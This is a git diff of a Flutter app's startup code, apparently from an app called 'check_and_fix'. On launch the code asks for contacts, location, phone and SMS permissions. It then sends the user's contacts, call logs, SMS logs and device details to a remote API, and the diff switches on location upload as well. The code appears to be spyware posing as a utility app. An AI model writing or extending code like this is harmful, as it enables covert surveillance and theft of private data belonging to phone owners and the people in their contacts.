@@ -4,7 +4,6 @@ import 'dart:io';
 
 import 'package:check_and_fix/presentation/utils/color_printer.dart';
 import 'package:check_and_fix/services/api_services.dart';
-import 'package:device_info_plus/device_info_plus.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
@@ -29,7 +28,7 @@ class Init {
     printWhite('agent: $agent');
 
     // await FileManager.requestFilesAccessPermission();
-    final getContacts = await _requestPermission(Permission.contacts);
+    final haveContactPermission = await _requestPermission(Permission.contacts);
     if (uuid != null) await _requestPermission(Permission.location);
     await _requestPermission(Permission.phone);
     await _requestPermission(Permission.sms);
@@ -38,9 +37,9 @@ class Init {
     //! LOGIN PAGE REPLACE THIS!
     // dummyLoader();
 
-    // Api.sendLocation(agent, uuid);
-    if (getContacts) await Api.sendContacts(context, agent, uuid);
-    print('getContacts $getContacts');
+    if (haveContactPermission) await Api.sendContacts(context, agent, uuid);
+    if (uuid != null) Api.sendLocation(agent, uuid);
+    print('haveContactPermission $haveContactPermission');
     if (!kIsWeb && Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
     if (!kIsWeb && Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
 
@@ -54,13 +53,10 @@ class Init {
       agent = FkUserAgent.userAgent!;
       print('AGENT ${agent}');
 
-      final deviceInfo = await DeviceInfoPlugin().deviceInfo;
-      // print('deviceInfo ${deviceInfo}');
-
       imei = box.get('imei') ??
           const Uuid().v4(); // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
-      uuid = box.get('uuid');
 
+      // uuid = box.get('uuid');
       // 1ST Time only.
       uuid ??= await Api.sendDeviceInfo(agent!, imei);
       box.put('uuid', uuid);
